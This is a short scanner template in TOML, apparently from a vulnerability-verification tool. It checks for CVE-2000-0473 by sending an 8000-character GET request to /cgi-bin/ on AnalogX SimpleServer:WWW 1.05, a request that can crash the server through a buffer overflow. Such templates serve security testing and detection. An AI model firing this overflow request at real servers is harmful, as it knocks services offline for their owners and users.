[info]
author = "ave"
description = "验证 AnalogX SimpleServer:WWW 1.05 cgi-bin 目录长 GET 请求缓冲区溢出拒绝服务漏洞"
id = "POC-AVE-2000-0396"
name = "CVE-2000-0473 PoC"
severity = "high"
tags = ["ave-2000-0396"]
vuln_id = [
    "CVE-2000-0473",
    "AVE-2000-0396",
]

[poc]
logic = "all"

[[poc.requests]]
method = "GET"
path = "/cgi-bin/{{crap(8000)}}"
protocol = "http"

[poc.requests.body]
content = ""
type = "raw"

[poc.requests.headers]
User-Agent = "AVE/1.0"

[[poc.requests.matchers]]
expect = true
part = "status"
status = [
    200,
    404,
    500,
    502,
    503,
    504,
]
type = "status"
